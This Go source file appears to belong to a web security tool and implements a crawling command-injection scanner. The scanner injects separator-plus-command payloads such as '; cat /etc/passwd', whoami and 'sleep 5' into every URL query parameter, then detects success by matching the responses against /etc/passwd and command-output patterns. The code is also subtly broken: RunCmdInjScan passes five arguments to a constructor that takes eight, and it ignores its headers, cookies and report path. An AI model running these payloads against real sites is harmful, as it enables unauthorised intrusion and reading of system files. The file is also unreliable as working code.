package scanners

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// --- Command Injection Scanner Implementation ---

// FindingCmdInj describes a discovered potential Command Injection
type FindingCmdInj struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	ResponseSnippet string `json:"response_snippet"`
	Evidence        string `json:"evidence"`
	Timestamp       string `json:"timestamp"`
}

// CmdInjScanner holds the state for the Command Injection scan
type CmdInjScanner struct {
	StartURL    *url.URL
	Client      *http.Client
	Visited     map[string]bool
	VisitedMu   sync.RWMutex
	Queue       chan cmdInjCrawlJob
	Findings    []FindingCmdInj
	FindingsMu  sync.Mutex
	Workers     int
	Active      int32
	MaxPages    int
	PageCount   int
	PageCountMu sync.Mutex
	MaxDepth    int
	Payloads    []string
	Intensity   int
	TargetedCVEs []string
	Throttle    time.Duration
}

// cmdInjCrawlJob represents a URL to be scanned
type cmdInjCrawlJob struct {
	URL   string
	Depth int
}

func NewCmdInjScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*CmdInjScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
	}

	payloads := generateCmdInjPayloads(intensity, targetedCVEs, customPayloads)

	s := &CmdInjScanner{
		StartURL:     parsed,
		Client:       client,
		Visited:      make(map[string]bool),
		Queue:        make(chan cmdInjCrawlJob, 1000),
		Findings:     []FindingCmdInj{},
		Workers:      workers,
		MaxPages:     maxPages,
		MaxDepth:     maxDepth,
		Throttle:     throttle,
		Payloads:     payloads,
		Intensity:    intensity,
		TargetedCVEs: targetedCVEs,
	}
	return s, nil
}

// Run starts the scanning process
func (s *CmdInjScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	s.enqueue(s.StartURL.String(), 0)

	for {
		time.Sleep(500 * time.Millisecond)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			time.Sleep(1 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

func (s *CmdInjScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1)
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1)
			return
		}
		s.PageCountMu.Unlock()

		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1)
			continue
		}

		log.Printf("[CmdInj Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		s.fuzzURL(job.URL)

		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1)
	}
}

func (s *CmdInjScanner) crawl(u string, depth int) {
	resp, err := s.Client.Get(u)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, depth+1)
		}
	})
}

func (s *CmdInjScanner) fuzzURL(rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	query := u.Query()
	if len(query) == 0 {
		return
	}

	for param, values := range query {
		for _, payload := range s.Payloads {
			if s.Throttle > 0 {
				time.Sleep(s.Throttle)
			}

			newQuery := u.Query()
			newQuery.Set(param, payload)
			u.RawQuery = newQuery.Encode()
			testURL := u.String()

			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Knife-CmdInj-Scanner/1.0")

			startTime := time.Now()
			resp, err := s.Client.Do(req)
			if err != nil {
				continue
			}
			duration := time.Since(startTime)

			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(bodyBytes)

			// Simple signature detection
			if evidence, found := s.detectCmdInj(bodyStr); found {
				s.addFinding(FindingCmdInj{
					Type:            "Command Injection",
					URL:             testURL,
					Param:           param,
					Payload:         payload,
					ResponseSnippet: snippet(bodyStr, 200),
					Evidence:        evidence,
				})
			}

			// Time-based detection (Intensity > 3)
			if s.Intensity > 3 && strings.Contains(payload, "sleep") {
				if duration >= 5*time.Second {
					s.addFinding(FindingCmdInj{
						Type:            "Blind Command Injection (Time-based)",
						URL:             testURL,
						Param:           param,
						Payload:         payload,
						ResponseSnippet: "N/A (Blind)",
						Evidence:        fmt.Sprintf("Delayed response: %v (expected ~5s)", duration),
					})
				}
			}
		}
	}
}

func (s *CmdInjScanner) detectCmdInj(body string) (string, bool) {
	signatures := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{regexp.MustCompile(`root:x:0:0`), "/etc/passwd content"},
		{regexp.MustCompile(`uid=\d+\(.*\)\s+gid=\d+\(.*\)`), "id command output"},
		{regexp.MustCompile(`Windows IP Configuration`), "ipconfig output"},
		{regexp.MustCompile(`Active Connections`), "netstat output"},
		{regexp.MustCompile(`Volume Serial Number is`), "dir output"},
		{regexp.MustCompile(`PING 127.0.0.1`), "ping output"}, // If we echo back the command
		{regexp.MustCompile(`GNU/Linux`), "uname output"},
		{regexp.MustCompile(`Linux version`), "uname -a output"},
		{regexp.MustCompile(`Directory of C:\\`), "dir output"},
	}

	for _, sig := range signatures {
		if sig.Pattern.MatchString(body) {
			match := sig.Pattern.FindString(body)
			return fmt.Sprintf("Matched signature: %s (%s)", sig.Name, match), true
		}
	}

	return "", false
}

func generateCmdInjPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
	var payloads []string

	// CVE-specific payloads
	for _, id := range targetedCVEs {
		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerCommandInjection {
			payloads = append(payloads, cve.Payloads...)
		}
	}

	// Separators: ; | & && \n $( ) `
	separators := []string{";", "|", "&", "&&", "\n", "`", "$()"}
	commands := []string{"id", "whoami"}

	if intensity > 2 {
		commands = append(commands, "cat /etc/passwd", "uname -a", "ipconfig")
	}

	if intensity > 3 {
		commands = append(commands, "sleep 5", "ping -c 5 127.0.0.1")
	}

	// Basic injection
	for _, sep := range separators {
		for _, cmd := range commands {
			payloads = append(payloads, sep+" "+cmd)
			payloads = append(payloads, sep+cmd)
		}
	}

	if intensity > 3 {
		// Quote closing and complex variants
		quotes := []string{"'", "\""}
		for _, q := range quotes {
			for _, sep := range separators {
				for _, cmd := range commands {
					payloads = append(payloads, q+sep+" "+cmd)
					payloads = append(payloads, q+sep+cmd+sep)
				}
			}
		}
	}

	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	return payloads
}

func (s *CmdInjScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *CmdInjScanner) enqueue(u string, depth int) {
	u = strings.Split(u, "#")[0]
	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- cmdInjCrawlJob{URL: u, Depth: depth}:
	default:
	}
}

func (s *CmdInjScanner) addFinding(f FindingCmdInj) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] COMMAND INJECTION FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *CmdInjScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return "", err
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}

func RunCmdInjScan(target string, headers map[string]string, cookies string, reportPath string) error {
	fmt.Println("[*] Starting Command Injection Scanner on", target)

	scanner, err := NewCmdInjScanner(target, 10, 100, 3, 200*time.Millisecond)
	if err != nil {
		return err
	}

	scanner.Run()

	fmt.Printf("[*] Scan complete. Found %d potential vulnerabilities.\n", len(scanner.Findings))

	return err
}
